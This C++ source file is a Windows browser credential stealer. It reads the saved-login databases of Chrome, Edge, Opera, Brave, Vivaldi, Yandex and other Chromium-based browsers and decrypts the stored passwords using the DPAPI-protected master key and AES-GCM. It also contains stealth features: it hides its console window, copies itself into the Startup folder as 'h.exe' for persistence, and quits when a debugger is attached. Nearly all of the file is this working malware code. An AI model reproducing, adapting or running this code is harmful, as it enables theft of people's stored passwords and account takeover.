#define DEBUG_MOD
#include "Base64.h"
#include "binaryhandling.hpp"
#include <cstdio>
#include <iostream>
#include "json.hpp"
#include <map>
#include "plusaes_wrapper.hpp"
#include <string>
#include "sqlite3.h"
#include <windows.h>
#include <Wincrypt.h>
#pragma comment(lib, "sqlite3")
#pragma comment(lib, "user32")
#pragma comment(lib, "Crypt32")

std::string con, browser;
std::map<std::string, std::string> paths;

std::string decrypt_c32(std::string cont) {
    DATA_BLOB out;
    DATA_BLOB buf;
    buf.pbData = reinterpret_cast<BYTE*>(cont.data());
    buf.cbData = (DWORD) cont.size();
    std::string dec_buffer;

    if (CryptUnprotectData(&buf, NULL, NULL, NULL, NULL, NULL, &out)) {
        for (int i = 0; i < out.cbData; i++) {
            dec_buffer += out.pbData[i];
        }

        #ifdef DEBUG_MOD
        std::cout << "Decrypted Crypt32: " << dec_buffer << " Size: " << dec_buffer.size() << "\n";
        #endif

        LocalFree(out.pbData);

        return dec_buffer;
    }
    else {
        #ifdef DEBUG_MOD
        std::cerr << "Error: " << GetLastError() << "\n";
        return std::to_string(GetLastError());
        #else
        return "";
        #endif
    }
}

void trim_data(std::string original_data, std::string* out_pass, std::string* out_tag, std::string* iv) {
    #ifdef DEBUG_MOD
    std::cout << "Data size: " << original_data.size() << "\n";
    #endif
    std::string buf;

    *iv = original_data.substr(3, 12);
    buf = original_data.substr(15, original_data.size() - 15);
    *out_tag = buf.substr(buf.size() - 16, 16);
    *out_pass = buf.substr(0, buf.size() - out_tag->size());

    #ifdef DEBUG_MOD
    std::cout << "Out pass: " << *out_pass << " Size: " << out_pass->size() << "\nOut tag: " << *out_tag << " Size: " << out_tag->size() << "\nIV: " << *iv << " Size: " << iv->size() << "\n";
    #endif
}

std::string master_k(std::string path) {
    //std::string mkey_path = std::string{getenv("localappdata")} + "\\Google\\Chrome\\User Data\\Default\\Local State";
    std::string content;
    try {
        nk125::binary_file_handler b;
        content = b.read_file(path);
        auto v = nlohmann::json::parse(content);
        content = v["os_crypt"]["encrypted_key"];
    }
    catch (...) {return "";}

    #ifdef DEBUG_MOD
    std::cout << "Encrypted Master key: " << content << "\n";
    #endif

    std::string master;
    macaron::Base64::Decode(content, master);
    master = decrypt_c32(master.substr(5, master.size() - 5));

    return master;
}

std::string decrypt_ch(std::string content) {
    std::string master_path, dec_buf;
    std::string local(getenv("localappdata"));

    if (browser == "Vivaldi") {
        master_path = local + "/Vivaldi/Local State";
    }
    else if (browser == "Yandex") {
        master_path = local + "/Yandex/YandexBrowser/Local State";
    }
    else {
        master_path = paths[browser] + "Local State";
    }

    std::string key = master_k(master_path);
    nk125::plusaes_wrapper aes;
    std::string data, gcm_tag, iv;

    trim_data(content, &data, &gcm_tag, &iv);

    aes.set_tw_iv(reinterpret_cast<unsigned char*>(iv.data()));

    dec_buf = aes.gcm_decrypt(data, key, gcm_tag);

    #ifdef DEBUG_MOD
    std::cout << "Decrypted buffer: " << dec_buf << " Size: " << dec_buf.size() << "\n";
    #endif

    return dec_buf;
}

int tHandler(void* nil, int argc, char** second, char** first) {
    #ifdef DEBUG_MOD
    std::cout << "Argc: " << argc << "\n";
    #endif

    for (int ind = 0; ind < argc; ind++) {
        std::string key = first[ind], value = second[ind];
        std::cout << "Key: " << key << " Value: " << value << "\n";
        if (!value.empty() || !key.empty()) {
            if (key == "action_url") {
                con.append("-----\nBrowser: " + browser + "\nURL: " + value + "\n");
            }

            if (key == "username_value") {
                con.append("Email/User: " + value + "\n");
            }

            if (key == "password_value") {
                std::string ftag = value.substr(0, 3);
                std::string dec;

                if (ftag == "v10" || ftag == "v11") {
                    dec = decrypt_ch(value);
                }
                else {
                    dec = decrypt_c32(value);
                }

                con.append("Pass: " + dec + "\n\n");
            }
        }
    }
    return 0;
}

void sql_chromium(std::string path) {
    using namespace std;
    //string dbp = string{getenv("localappdata")} + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    nk125::binary_file_handler b;
    std::string path_db;

    if (browser == "Chrome") {
        path_db = path + "Default/Login Data";
    }
    else {
        path_db = path + "Login Data";
    }

    try {
        b.fast_copy_file(path_db, path_db + ".d");
    }
    catch(...) {return;}

    sqlite3* datab;
    int failed = sqlite3_open(std::string{path_db + ".d"}.c_str(), &datab);

    if (failed) {
        #ifdef DEBUG_MOD
        std::cerr << "Error: " << failed << ", " << path << "\n";
        #endif
        return;
    }
    else {
        #ifdef DEBUG_MOD
        char* err;
        int r = sqlite3_exec(datab, "SELECT action_url, username_value, password_value FROM logins", tHandler, 0, &err);
        if (r) {
            std::cout << "Ret: " << err << "\n";
        }
        #else
        sqlite3_exec(datab, "SELECT action_url, username_value, password_value FROM logins", tHandler, 0, 0);
        #endif
        sqlite3_close(datab);
    }
}

void saveStartup(char* argv[]) {
    std::string path = std::string{getenv("appdata")} + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    std::string exe(argv[0]);

    if (exe.find(path) != std::string::npos) {
        return;
    }

    nk125::binary_file_handler b;
    try {
        b.copy_file(exe, path + "h.exe");
    }
    catch (...) {
        return;
    }
}

void hide() {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(window, 0);
}

void init(char* argv[]) {
    #ifndef DEBUG_MOD
    hide();
    saveStartup(argv);
    #endif
    std::string roaming(getenv("appdata"));
    std::string local(getenv("localappdata"));

    paths.insert({
        {"Opera", roaming + "/Opera Software/Opera Stable/"},
        {"OperaGX", roaming + "/Opera Software/Opera GX Stable/"},
        {"Edge", local + "/Microsoft/Edge/User Data/"},
        {"Chromium", local + "/Chromium/User Data/"},
        {"Brave", local + "/BraveSoftware/Brave-Browser/User Data/"},
        {"Chrome", local + "/Google/Chrome/User Data/"},
        {"Vivaldi", local + "/Vivaldi/User Data/Default/"},
        {"Yandex", local + "/Yandex/YandexBrowser/User Data/Default/"},
    });

    struct _stat32 info;

    for (auto path : paths) {
        browser = path.first;
        if (_stat32(path.second.c_str(), &info) == 0) {
            sql_chromium(path.second);
        }
    }
}

int main(int argc, char* argv[]) {
    #ifndef DEBUG_MOD
    if (IsDebuggerPresent()) {
        return 0;
    }
    #endif

    init(argv);

    #ifdef DEBUG_MOD
    std::cout << "Login Data: \n" << con << "\n";
    #endif
    return 0;
}
